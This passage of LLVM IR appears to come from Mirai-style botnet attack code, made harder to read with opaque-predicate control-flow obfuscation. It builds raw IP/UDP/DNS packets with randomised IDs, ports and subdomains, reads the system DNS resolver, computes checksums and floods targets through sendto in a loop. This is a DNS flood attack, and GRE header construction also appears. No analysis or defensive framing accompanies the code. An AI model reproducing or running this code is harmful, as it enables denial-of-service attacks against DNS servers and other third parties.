  store i8* %330, i8** %38, align 8
  br label %350

; <label>:331:                                    ; preds = %originalBBpart284
  %332 = load i32, i32* @x.37
  %333 = load i32, i32* @y.38
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %331
  %340 = load i8, i8* %32, align 1
  %341 = add i8 %340, 1
  store i8 %341, i8* %32, align 1
  %342 = load i32, i32* @x.37
  %343 = load i32, i32* @y.38
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBBpart298, label %originalBB86alteredBB

originalBBpart298:                                ; preds = %originalBB86
  br label %350

; <label>:350:                                    ; preds = %originalBBpart298, %321
  %351 = load i32, i32* @x.37
  %352 = load i32, i32* @y.38
  %353 = sub i32 %351, 1
  %354 = mul i32 %351, %353
  %355 = urem i32 %354, 2
  %356 = icmp eq i32 %355, 0
  %357 = icmp slt i32 %352, 10
  %358 = or i1 %356, %357
  br i1 %358, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %350
  %359 = load i32, i32* @x.37
  %360 = load i32, i32* @y.38
  %361 = sub i32 %359, 1
  %362 = mul i32 %359, %361
  %363 = urem i32 %362, 2
  %364 = icmp eq i32 %363, 0
  %365 = icmp slt i32 %360, 10
  %366 = or i1 %364, %365
  br i1 %366, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br label %367

; <label>:367:                                    ; preds = %originalBBpart2102
  %368 = load i32, i32* %31, align 4
  %369 = add nsw i32 %368, 1
  store i32 %369, i32* %31, align 4
  br label %293

; <label>:370:                                    ; preds = %293
  %371 = load i32, i32* @x.37
  %372 = load i32, i32* @y.38
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %370
  %379 = load i8, i8* %32, align 1
  %380 = load i8*, i8** %38, align 8
  store i8 %379, i8* %380, align 1
  %381 = load i8*, i8** %37, align 8
  %382 = load i32, i32* %29, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds i8, i8* %381, i64 %383
  %385 = getelementptr inbounds i8, i8* %384, i64 2
  %386 = bitcast i8* %385 to %struct.grehdr*
  store %struct.grehdr* %386, %struct.grehdr** %39, align 8
  %387 = call zeroext i16 @htons(i16 zeroext 1) #7
  %388 = load %struct.grehdr*, %struct.grehdr** %39, align 8
  %389 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %388, i32 0, i32 0
  store i16 %387, i16* %389, align 2
  %390 = call zeroext i16 @htons(i16 zeroext 1) #7
  %391 = load %struct.grehdr*, %struct.grehdr** %39, align 8
  %392 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %391, i32 0, i32 1
  store i16 %390, i16* %392, align 2
  %393 = load i32, i32* @x.37
  %394 = load i32, i32* @y.38
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
  br i1 %400, label %originalBBpart2106, label %originalBB104alteredBB

originalBBpart2106:                               ; preds = %originalBB104
  br label %401

; <label>:401:                                    ; preds = %originalBBpart2106
  %402 = load i32, i32* %17, align 4
  %403 = add nsw i32 %402, 1
  store i32 %403, i32* %17, align 4
  br label %128

; <label>:404:                                    ; preds = %originalBBpart28
  br label %405

; <label>:405:                                    ; preds = %571, %404
  store i32 0, i32* %17, align 4
  br label %406

; <label>:406:                                    ; preds = %568, %405
  %407 = load i32, i32* %17, align 4
  %408 = load i8, i8* %13, align 1
  %409 = zext i8 %408 to i32
  %410 = icmp slt i32 %407, %409
  br i1 %410, label %411, label %571

; <label>:411:                                    ; preds = %406
  %412 = load i8**, i8*** %19, align 8
  %413 = load i32, i32* %17, align 4
  %414 = sext i32 %413 to i64
  %415 = getelementptr inbounds i8*, i8** %412, i64 %414
  %416 = load i8*, i8** %415, align 8
  store i8* %416, i8** %40, align 8
  %417 = load i8*, i8** %40, align 8
  %418 = bitcast i8* %417 to %struct.iphdr*
  store %struct.iphdr* %418, %struct.iphdr** %41, align 8
  %419 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i64 1
  %421 = bitcast %struct.iphdr* %420 to %struct.udphdr*
  store %struct.udphdr* %421, %struct.udphdr** %42, align 8
  %422 = load %struct.udphdr*, %struct.udphdr** %42, align 8
  %423 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %422, i64 1
  %424 = bitcast %struct.udphdr* %423 to %struct.dnshdr*
  store %struct.dnshdr* %424, %struct.dnshdr** %43, align 8
  %425 = load %struct.dnshdr*, %struct.dnshdr** %43, align 8
  %426 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %425, i64 1
  %427 = bitcast %struct.dnshdr* %426 to i8*
  %428 = getelementptr inbounds i8, i8* %427, i64 1
  store i8* %428, i8** %44, align 8
  %429 = load i16, i16* %21, align 2
  %430 = zext i16 %429 to i32
  %431 = icmp eq i32 %430, 65535
  br i1 %431, label %432, label %438

; <label>:432:                                    ; preds = %411
  %433 = call i32 @rand_next()
  %434 = and i32 %433, 65535
  %435 = trunc i32 %434 to i16
  %436 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %437 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %436, i32 0, i32 3
  store i16 %435, i16* %437, align 4
  br label %438

; <label>:438:                                    ; preds = %432, %411
  %439 = load i16, i16* %24, align 2
  %440 = zext i16 %439 to i32
  %441 = icmp eq i32 %440, 65535
  br i1 %441, label %442, label %464

; <label>:442:                                    ; preds = %438
  %443 = load i32, i32* @x.37
  %444 = load i32, i32* @y.38
  %445 = sub i32 %443, 1
  %446 = mul i32 %443, %445
  %447 = urem i32 %446, 2
  %448 = icmp eq i32 %447, 0
  %449 = icmp slt i32 %444, 10
  %450 = or i1 %448, %449
  br i1 %450, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %442
  %451 = call i32 @rand_next()
  %452 = and i32 %451, 65535
  %453 = trunc i32 %452 to i16
  %454 = load %struct.udphdr*, %struct.udphdr** %42, align 8
  %455 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %454, i32 0, i32 0
  store i16 %453, i16* %455, align 2
  %456 = load i32, i32* @x.37
  %457 = load i32, i32* @y.38
  %458 = sub i32 %456, 1
  %459 = mul i32 %456, %458
  %460 = urem i32 %459, 2
  %461 = icmp eq i32 %460, 0
  %462 = icmp slt i32 %457, 10
  %463 = or i1 %461, %462
  br i1 %463, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br label %464

; <label>:464:                                    ; preds = %originalBBpart2110, %438
  %465 = load i32, i32* @x.37
  %466 = load i32, i32* @y.38
  %467 = sub i32 %465, 1
  %468 = mul i32 %465, %467
  %469 = urem i32 %468, 2
  %470 = icmp eq i32 %469, 0
  %471 = icmp slt i32 %466, 10
  %472 = or i1 %470, %471
  br i1 %472, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %464
  %473 = load i16, i16* %25, align 2
  %474 = zext i16 %473 to i32
  %475 = icmp eq i32 %474, 65535
  %476 = load i32, i32* @x.37
  %477 = load i32, i32* @y.38
  %478 = sub i32 %476, 1
  %479 = mul i32 %476, %478
  %480 = urem i32 %479, 2
  %481 = icmp eq i32 %480, 0
  %482 = icmp slt i32 %477, 10
  %483 = or i1 %481, %482
  br i1 %483, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br i1 %475, label %484, label %490

; <label>:484:                                    ; preds = %originalBBpart2114
  %485 = call i32 @rand_next()
  %486 = and i32 %485, 65535
  %487 = trunc i32 %486 to i16
  %488 = load %struct.udphdr*, %struct.udphdr** %42, align 8
  %489 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %488, i32 0, i32 1
  store i16 %487, i16* %489, align 2
  br label %490

; <label>:490:                                    ; preds = %484, %originalBBpart2114
  %491 = load i16, i16* %26, align 2
  %492 = zext i16 %491 to i32
  %493 = icmp eq i32 %492, 65535
  br i1 %493, label %494, label %500

; <label>:494:                                    ; preds = %490
  %495 = call i32 @rand_next()
  %496 = and i32 %495, 65535
  %497 = trunc i32 %496 to i16
  %498 = load %struct.dnshdr*, %struct.dnshdr** %43, align 8
  %499 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %498, i32 0, i32 0
  store i16 %497, i16* %499, align 2
  br label %500

; <label>:500:                                    ; preds = %494, %490
  %501 = load i8*, i8** %44, align 8
  %502 = load i8, i8* %27, align 1
  %503 = zext i8 %502 to i32
  call void @rand_alpha_str(i8* %501, i32 %503)
  %504 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %505 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %504, i32 0, i32 7
  store i16 0, i16* %505, align 2
  %506 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %507 = bitcast %struct.iphdr* %506 to i16*
  %508 = call zeroext i16 @checksum_generic(i16* %507, i32 20)
  %509 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %510 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %509, i32 0, i32 7
  store i16 %508, i16* %510, align 2
  %511 = load %struct.udphdr*, %struct.udphdr** %42, align 8
  %512 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %511, i32 0, i32 3
  store i16 0, i16* %512, align 2
  %513 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %514 = load %struct.udphdr*, %struct.udphdr** %42, align 8
  %515 = bitcast %struct.udphdr* %514 to i8*
  %516 = load %struct.udphdr*, %struct.udphdr** %42, align 8
  %517 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %516, i32 0, i32 2
  %518 = load i16, i16* %517, align 2
  %519 = load i8, i8* %27, align 1
  %520 = zext i8 %519 to i64
  %521 = add i64 21, %520
  %522 = add i64 %521, 2
  %523 = load i32, i32* %29, align 4
  %524 = sext i32 %523 to i64
  %525 = add i64 %522, %524
  %526 = add i64 %525, 4
  %527 = trunc i64 %526 to i32
  %528 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %513, i8* %515, i16 zeroext %518, i32 %527)
  %529 = load %struct.udphdr*, %struct.udphdr** %42, align 8
  %530 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %529, i32 0, i32 3
  store i16 %528, i16* %530, align 2
  %531 = load i32, i32* %30, align 4
  %532 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %533 = load i32, i32* %17, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %532, i64 %534
  %536 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %535, i32 0, i32 0
  %537 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %536, i32 0, i32 2
  %538 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %537, i32 0, i32 0
  store i32 %531, i32* %538, align 4
  %539 = load %struct.udphdr*, %struct.udphdr** %42, align 8
  %540 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %539, i32 0, i32 1
  %541 = load i16, i16* %540, align 2
  %542 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %543 = load i32, i32* %17, align 4
  %544 = sext i32 %543 to i64
  %545 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %542, i64 %544
  %546 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %545, i32 0, i32 0
  %547 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %546, i32 0, i32 1
  store i16 %541, i16* %547, align 2
  %548 = load i32, i32* %18, align 4
  %549 = load i8*, i8** %40, align 8
  %550 = load i8, i8* %27, align 1
  %551 = zext i8 %550 to i64
  %552 = add i64 41, %551
  %553 = add i64 %552, 2
  %554 = load i32, i32* %29, align 4
  %555 = sext i32 %554 to i64
  %556 = add i64 %553, %555
  %557 = add i64 %556, 4
  %558 = bitcast %union.__CONST_SOCKADDR_ARG* %45 to %struct.sockaddr**
  %559 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %560 = load i32, i32* %17, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %559, i64 %561
  %563 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %562, i32 0, i32 0
  %564 = bitcast %struct.sockaddr_in* %563 to %struct.sockaddr*
  store %struct.sockaddr* %564, %struct.sockaddr** %558, align 8
  %565 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %45, i32 0, i32 0
  %566 = load %struct.sockaddr*, %struct.sockaddr** %565, align 8
  %567 = call i64 @sendto(i32 %548, i8* %549, i64 %557, i32 16384, %struct.sockaddr* %566, i32 16)
  br label %568

; <label>:568:                                    ; preds = %500
  %569 = load i32, i32* %17, align 4
  %570 = add nsw i32 %569, 1
  store i32 %570, i32* %17, align 4
  br label %406

; <label>:571:                                    ; preds = %406
  br label %405

; <label>:572:                                    ; preds = %124, %118, %96
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %573 = alloca i8, align 1
  %574 = alloca %struct.attack_target*, align 8
  %575 = alloca i8, align 1
  %576 = alloca %struct.attack_option*, align 8
  %577 = alloca i32, align 4
  %578 = alloca i32, align 4
  %579 = alloca i8**, align 8
  %580 = alloca i8, align 1
  %581 = alloca i16, align 2
  %582 = alloca i8, align 1
  %583 = alloca i8, align 1
  %584 = alloca i16, align 2
  %585 = alloca i16, align 2
  %586 = alloca i16, align 2
  %587 = alloca i8, align 1
  %588 = alloca i8*, align 8
  %589 = alloca i32, align 4
  %590 = alloca i32, align 4
  %591 = alloca i32, align 4
  %592 = alloca i8, align 1
  %593 = alloca i8, align 1
  %594 = alloca %struct.iphdr*, align 8
  %595 = alloca %struct.udphdr*, align 8
  %596 = alloca %struct.dnshdr*, align 8
  %597 = alloca i8*, align 8
  %598 = alloca i8*, align 8
  %599 = alloca %struct.grehdr*, align 8
  %600 = alloca i8*, align 8
  %601 = alloca %struct.iphdr*, align 8
  %602 = alloca %struct.udphdr*, align 8
  %603 = alloca %struct.dnshdr*, align 8
  %604 = alloca i8*, align 8
  %605 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %573, align 1
  store %struct.attack_target* %1, %struct.attack_target** %574, align 8
  store i8 %2, i8* %575, align 1
  store %struct.attack_option* %3, %struct.attack_option** %576, align 8
  %606 = load i8, i8* %573, align 1
  %607 = zext i8 %606 to i64
  %608 = call noalias i8* @calloc(i64 %607, i64 8) #6
  %609 = bitcast i8* %608 to i8**
  store i8** %609, i8*** %579, align 8
  %610 = load i8, i8* %575, align 1
  %611 = load %struct.attack_option*, %struct.attack_option** %576, align 8
  %612 = call i32 @attack_get_opt_int(i8 zeroext %610, %struct.attack_option* %611, i8 zeroext 2, i32 0)
  %613 = trunc i32 %612 to i8
  store i8 %613, i8* %580, align 1
  %614 = load i8, i8* %575, align 1
  %615 = load %struct.attack_option*, %struct.attack_option** %576, align 8
  %616 = call i32 @attack_get_opt_int(i8 zeroext %614, %struct.attack_option* %615, i8 zeroext 3, i32 65535)
  %617 = trunc i32 %616 to i16
  store i16 %617, i16* %581, align 2
  %618 = load i8, i8* %575, align 1
  %619 = load %struct.attack_option*, %struct.attack_option** %576, align 8
  %620 = call i32 @attack_get_opt_int(i8 zeroext %618, %struct.attack_option* %619, i8 zeroext 4, i32 64)
  %621 = trunc i32 %620 to i8
  store i8 %621, i8* %582, align 1
  %622 = load i8, i8* %575, align 1
  %623 = load %struct.attack_option*, %struct.attack_option** %576, align 8
  %624 = call i32 @attack_get_opt_int(i8 zeroext %622, %struct.attack_option* %623, i8 zeroext 5, i32 0)
  %625 = trunc i32 %624 to i8
  store i8 %625, i8* %583, align 1
  %626 = load i8, i8* %575, align 1
  %627 = load %struct.attack_option*, %struct.attack_option** %576, align 8
  %628 = call i32 @attack_get_opt_int(i8 zeroext %626, %struct.attack_option* %627, i8 zeroext 6, i32 65535)
  %629 = trunc i32 %628 to i16
  store i16 %629, i16* %584, align 2
  %630 = load i8, i8* %575, align 1
  %631 = load %struct.attack_option*, %struct.attack_option** %576, align 8
  %632 = call i32 @attack_get_opt_int(i8 zeroext %630, %struct.attack_option* %631, i8 zeroext 7, i32 53)
  %633 = trunc i32 %632 to i16
  store i16 %633, i16* %585, align 2
  %634 = load i8, i8* %575, align 1
  %635 = load %struct.attack_option*, %struct.attack_option** %576, align 8
  %636 = call i32 @attack_get_opt_int(i8 zeroext %634, %struct.attack_option* %635, i8 zeroext 9, i32 65535)
  %637 = trunc i32 %636 to i16
  store i16 %637, i16* %586, align 2
  %638 = load i8, i8* %575, align 1
  %639 = load %struct.attack_option*, %struct.attack_option** %576, align 8
  %640 = call i32 @attack_get_opt_int(i8 zeroext %638, %struct.attack_option* %639, i8 zeroext 0, i32 12)
  %641 = trunc i32 %640 to i8
  store i8 %641, i8* %587, align 1
  %642 = load i8, i8* %575, align 1
  %643 = load %struct.attack_option*, %struct.attack_option** %576, align 8
  %644 = call i8* @attack_get_opt_str(i8 zeroext %642, %struct.attack_option* %643, i8 zeroext 8, i8* null)
  store i8* %644, i8** %588, align 8
  %645 = call i32 @get_dns_resolver()
  store i32 %645, i32* %590, align 4
  %646 = load i8*, i8** %588, align 8
  %647 = icmp eq i8* %646, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %97
  %648 = load i8*, i8** %28, align 8
  %649 = call i32 @util_strlen(i8* %648)
  store i32 %649, i32* %29, align 4
  %650 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %650, i32* %18, align 4
  %651 = icmp eq i32 %650, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %128
  %652 = load i32, i32* %17, align 4
  %653 = load i8, i8* %13, align 1
  %654 = zext i8 %653 to i32
  %655 = icmp slt i32 %652, %654
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %149
  store i8 0, i8* %32, align 1
  store i8 0, i8* %33, align 1
  %656 = call noalias i8* @calloc(i64 600, i64 1) #6
  %657 = load i8**, i8*** %19, align 8
  %658 = load i32, i32* %17, align 4
  %659 = sext i32 %658 to i64
  %660 = getelementptr inbounds i8*, i8** %657, i64 %659
  store i8* %656, i8** %660, align 8
  %661 = load i8**, i8*** %19, align 8
  %662 = load i32, i32* %17, align 4
  %663 = sext i32 %662 to i64
  %664 = getelementptr inbounds i8*, i8** %661, i64 %663
  %665 = load i8*, i8** %664, align 8
  %666 = bitcast i8* %665 to %struct.iphdr*
  store %struct.iphdr* %666, %struct.iphdr** %34, align 8
  %667 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %668 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %667, i64 1
  %669 = bitcast %struct.iphdr* %668 to %struct.udphdr*
  store %struct.udphdr* %669, %struct.udphdr** %35, align 8
  %670 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %671 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %670, i64 1
  %672 = bitcast %struct.udphdr* %671 to %struct.dnshdr*
  store %struct.dnshdr* %672, %struct.dnshdr** %36, align 8
  %673 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %674 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %673, i64 1
  %675 = bitcast %struct.dnshdr* %674 to i8*
  store i8* %675, i8** %37, align 8
  %676 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %677 = bitcast %struct.iphdr* %676 to i8*
  %678 = load i8, i8* %677, align 4
  %_ = sub i8 %678, 15
  %gen = mul i8 %_, 15
  %_11 = sub i8 0, %678
  %gen12 = add i8 %_11, 15
  %_13 = shl i8 %678, 15
  %679 = and i8 %678, 15
  %_14 = shl i8 %679, 64
  %_15 = sub i8 %679, 64
  %gen16 = mul i8 %_15, 64
  %_17 = sub i8 0, %679
  %gen18 = add i8 %_17, 64
  %_19 = sub i8 %679, 64
  %gen20 = mul i8 %_19, 64
  %_21 = sub i8 %679, 64
  %gen22 = mul i8 %_21, 64
  %_23 = sub i8 0, %679
  %gen24 = add i8 %_23, 64
  %_25 = shl i8 %679, 64
  %_26 = sub i8 %679, 64
  %gen27 = mul i8 %_26, 64
  %680 = or i8 %679, 64
  store i8 %680, i8* %677, align 4
  %681 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %682 = bitcast %struct.iphdr* %681 to i8*
  %683 = load i8, i8* %682, align 4
  %_28 = shl i8 %683, -16
  %_29 = sub i8 %683, -16
  %gen30 = mul i8 %_29, -16
  %_31 = sub i8 %683, -16
  %gen32 = mul i8 %_31, -16
  %684 = and i8 %683, -16
  %_33 = sub i8 0, %684
  %gen34 = add i8 %_33, 5
  %_35 = sub i8 0, %684
  %gen36 = add i8 %_35, 5
  %_37 = shl i8 %684, 5
  %_38 = shl i8 %684, 5
  %685 = or i8 %684, 5
  store i8 %685, i8* %682, align 4
  %686 = load i8, i8* %20, align 1
  %687 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %688 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %687, i32 0, i32 1
  store i8 %686, i8* %688, align 1
  %689 = load i8, i8* %27, align 1
  %690 = zext i8 %689 to i64
  %_39 = sub i64 0, 41
  %gen40 = add i64 %_39, %690
  %_41 = shl i64 41, %690
  %_42 = sub i64 0, 41
  %gen43 = add i64 %_42, %690
  %_44 = sub i64 41, %690
  %gen45 = mul i64 %_44, %690
  %_46 = sub i64 0, 41
  %gen47 = add i64 %_46, %690
  %_48 = sub i64 41, %690
  %gen49 = mul i64 %_48, %690
  %_50 = sub i64 41, %690
  %gen51 = mul i64 %_50, %690
  %_52 = sub i64 41, %690
  %gen53 = mul i64 %_52, %690
  %_54 = shl i64 41, %690
  %691 = add i64 41, %690
  %_55 = sub i64 0, %691
  %gen56 = add i64 %_55, 2
  %_57 = sub i64 0, %691
  %gen58 = add i64 %_57, 2
  %_59 = sub i64 0, %691
  %gen60 = add i64 %_59, 2
  %692 = add i64 %691, 2
  %693 = load i32, i32* %29, align 4
  %694 = sext i32 %693 to i64
  %_61 = shl i64 %692, %694
  %_62 = sub i64 0, %692
  %gen63 = add i64 %_62, %694
  %_64 = sub i64 0, %692
  %gen65 = add i64 %_64, %694
  %_66 = shl i64 %692, %694
  %_67 = shl i64 %692, %694
  %695 = add i64 %692, %694
  %_68 = sub i64 0, %695
  %gen69 = add i64 %_68, 4
  %_70 = sub i64 %695, 4
  %gen71 = mul i64 %_70, 4
  %_72 = shl i64 %695, 4
  %_73 = shl i64 %695, 4
  %_74 = shl i64 %695, 4
  %696 = add i64 %695, 4
  %697 = trunc i64 %696 to i16
  %698 = call zeroext i16 @htons(i16 zeroext %697) #7
  %699 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %700 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %699, i32 0, i32 2
  store i16 %698, i16* %700, align 2
  %701 = load i16, i16* %21, align 2
  %702 = call zeroext i16 @htons(i16 zeroext %701) #7
  %703 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %704 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %703, i32 0, i32 3
  store i16 %702, i16* %704, align 4
  %705 = load i8, i8* %22, align 1
  %706 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %707 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %706, i32 0, i32 5
  store i8 %705, i8* %707, align 4
  %708 = load i8, i8* %23, align 1
  %709 = icmp ne i8 %708, 0
  br label %originalBB10

originalBB78alteredBB:                            ; preds = %originalBB78, %220
  %710 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %711 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %712 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %711, i32 0, i32 4
  store i16 %710, i16* %712, align 2
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %297
  %713 = load i8*, i8** %28, align 8
  %714 = load i32, i32* %31, align 4
  %715 = sext i32 %714 to i64
  %716 = getelementptr inbounds i8, i8* %713, i64 %715
  %717 = load i8, i8* %716, align 1
  %718 = sext i8 %717 to i32
  %719 = icmp eq i32 %718, 46
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %331
  %720 = load i8, i8* %32, align 1
  %_87 = shl i8 %720, 1
  %_88 = shl i8 %720, 1
  %_89 = sub i8 %720, 1
  %gen90 = mul i8 %_89, 1
  %_91 = sub i8 %720, 1
  %gen92 = mul i8 %_91, 1
  %_93 = sub i8 0, %720
  %gen94 = add i8 %_93, 1
  %_95 = sub i8 %720, 1
  %gen96 = mul i8 %_95, 1
  %721 = add i8 %720, 1
  store i8 %721, i8* %32, align 1
  br label %originalBB86

originalBB100alteredBB:                           ; preds = %originalBB100, %350
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %370
  %722 = load i8, i8* %32, align 1
  %723 = load i8*, i8** %38, align 8
  store i8 %722, i8* %723, align 1
  %724 = load i8*, i8** %37, align 8
  %725 = load i32, i32* %29, align 4
  %726 = sext i32 %725 to i64
  %727 = getelementptr inbounds i8, i8* %724, i64 %726
  %728 = getelementptr inbounds i8, i8* %727, i64 2
  %729 = bitcast i8* %728 to %struct.grehdr*
  store %struct.grehdr* %729, %struct.grehdr** %39, align 8
  %730 = call zeroext i16 @htons(i16 zeroext 1) #7
  %731 = load %struct.grehdr*, %struct.grehdr** %39, align 8
  %732 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %731, i32 0, i32 0
  store i16 %730, i16* %732, align 2
  %733 = call zeroext i16 @htons(i16 zeroext 1) #7
  %734 = load %struct.grehdr*, %struct.grehdr** %39, align 8
  %735 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %734, i32 0, i32 1
  store i16 %733, i16* %735, align 2
  br label %originalBB104

originalBB108alteredBB:                           ; preds = %originalBB108, %442
  %736 = call i32 @rand_next()
  %737 = and i32 %736, 65535
  %738 = trunc i32 %737 to i16
  %739 = load %struct.udphdr*, %struct.udphdr** %42, align 8
  %740 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %739, i32 0, i32 0
  store i16 %738, i16* %740, align 2
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %464
  %741 = load i16, i16* %25, align 2
  %742 = zext i16 %741 to i32
  %743 = icmp eq i32 %742, 65535
  br label %originalBB112
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 21)
  %11 = call i8* @table_retrieve_val(i32 21, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 21)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %191

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* @x.39
  %17 = load i32, i32* @y.40
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  %24 = load i32, i32* %2, align 4
  %25 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %26 = call i64 @read(i32 %24, i8* %25, i64 2048)
  %27 = trunc i64 %26 to i32
  store i32 %27, i32* %3, align 4
  %28 = load i32, i32* %2, align 4
  %29 = call i32 @close(i32 %28)
  call void @table_unlock_val(i8 zeroext 22)
  %30 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %31 = load i32, i32* %3, align 4
  %32 = call i8* @table_retrieve_val(i32 22, i32* null)
  %33 = call i32 @util_stristr(i8* %30, i32 %31, i8* %32)
  store i32 %33, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 22)
  %34 = load i32, i32* %4, align 4
  %35 = icmp ne i32 %34, -1
  %36 = load i32, i32* @x.39
  %37 = load i32, i32* @y.40
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %35, label %44, label %174

; <label>:44:                                     ; preds = %originalBBpart2
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %45 = load i32, i32* %4, align 4
  store i32 %45, i32* %6, align 4
  br label %46

; <label>:46:                                     ; preds = %originalBBpart229, %44
  %47 = load i32, i32* %6, align 4
  %48 = load i32, i32* %3, align 4
